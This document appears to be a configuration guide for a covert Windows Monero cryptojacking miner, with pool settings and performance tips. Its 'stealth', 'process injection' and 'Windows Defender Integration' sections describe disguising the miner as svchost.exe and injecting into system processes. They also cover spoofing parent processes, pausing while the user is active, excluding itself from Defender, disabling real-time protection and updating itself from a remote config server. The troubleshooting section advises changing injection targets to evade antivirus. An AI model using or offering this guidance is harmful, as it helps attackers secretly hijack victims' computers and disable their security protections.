# Windows Monero Edition - Configuration Guide

## Overview
This Windows Monero Edition is optimized exclusively for RandomX (rx/0) CPU mining on Windows systems.

## Configuration File Structure

The miner uses an encrypted configuration stored in the Windows registry:
```
HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\MoneroMiner
```

## Key Settings

### Mining Configuration
```
Algorithm: rx/0
Wallet: [Your Monero Wallet Address]
Pool: [Mining Pool Address]
Worker: [Worker Name]
Threads: [0 = Auto-detect]
```

### Stealth Configuration
```
CPULimit: 70 (%)
PauseOnActivity: 1 (0=disabled, 1=enabled)
ActivityThreshold: 30 (seconds)
PauseOnBattery: 1
HideWindow: 1
ProcessName: svchost.exe (disguised process name)
```

### Process Injection
```
InjectionTarget: svchost.exe, conhost.exe, dwm.exe
AutoStart: 1
TokenImpersonation: 1
ParentSpoofing: 1
```

## Pool Configuration Examples

### Nanopool
```
URL: stratum+ssl://xmr.nanopool.org:14433
Wallet: [Your XMR Address]
Worker: rig-01
```

### SupportXMR
```
URL: stratum+tcp://pool.supportxmr.com:3333
Wallet: [Your XMR Address]
Worker: rig-01
```

### P2Pool (Decentralized)
```
URL: stratum+tcp://p2pool.node.address:3333
Wallet: [Your XMR Address]
Worker: rig-01
```

## Troubleshooting

### Low Hashrate
- Increase thread count in configuration
- Disable stealth pause settings temporarily
- Ensure huge pages are enabled in Windows
- Check for CPU throttling in BIOS

### Miner Not Starting
- Run as Administrator
- Check Windows Defender exclusions
- Verify wallet address format
- Check pool connectivity

### Detected by Antivirus
- Add process name to exclusions
- Modify injection target
- Use remote configuration update
- Check latest Windows Defender signatures

## Performance Tips

1. **Enable Huge Pages** - Increases RandomX performance by 20-30%
2. **CPU Affinity** - Pin mining threads to specific cores
3. **Process Priority** - Set to Below Normal to avoid detection
4. **Pool Selection** - Choose pool closest to your location
5. **Worker Naming** - Use meaningful names to track mining rigs

## Remote Configuration

Update miner settings remotely via URL:
```
RemoteConfigURL: https://your-config-server.com/config.bin
UpdateInterval: 100 minutes
```

## Windows Defender Integration

The miner automatically:
- Adds itself to Windows Defender exclusions
- Disables real-time protection for miner process
- Adds executable to quarantine whitelist
- Modifies Windows Defender policies

## System Requirements Verification

```
Windows 7 SP1 or higher
64-bit OS (32-bit and ARM64 builds also available)
AES-NI capable CPU (recommended)
2 GB RAM minimum
50 MB disk space
```

## Advanced Settings

### CPU Frequency Scaling
- Disable to maintain consistent hashrate
- Enable to reduce power consumption

### Memory Configuration
- Auto huge page detection and enablement
- NUMA awareness for multi-socket systems
- L3 cache optimization

### Watchdog Settings
- Restart interval: 30 seconds
- File integrity check enabled
- Auto-repair on corruption

---

For support and updates, see the main [README.md](README.md)
